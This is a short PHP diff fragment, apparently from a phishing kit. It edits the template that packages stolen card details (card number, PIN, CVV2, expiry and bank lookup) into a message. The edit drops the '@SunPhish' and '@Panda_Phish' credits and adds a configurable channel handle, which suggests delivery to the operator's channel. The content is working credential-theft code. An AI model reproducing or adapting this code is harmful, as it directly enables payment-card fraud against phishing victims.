@@ -39,14 +39,13 @@ $bankinfo = bank_information($cardn);
 
 
 $Text = "
-➖➖➖➖➖➖➖➖➖
+
 🔱Card: <code>$pan1 $pan2 $pan3 $pan4</code>
 🅿️Pass2: <code>$pin</code>
 🔆Cvv2: <code>$cvv</code>
 📅Year: <code>$year</code>  Month: <code>$month</code>
-➖➖➖➖➖➖➖➖➖
-Code By : @SunPhish
-Channel : @Panda_Phish
+
+⚡️:@$chanel
 $bankinfo[0]";
 
 
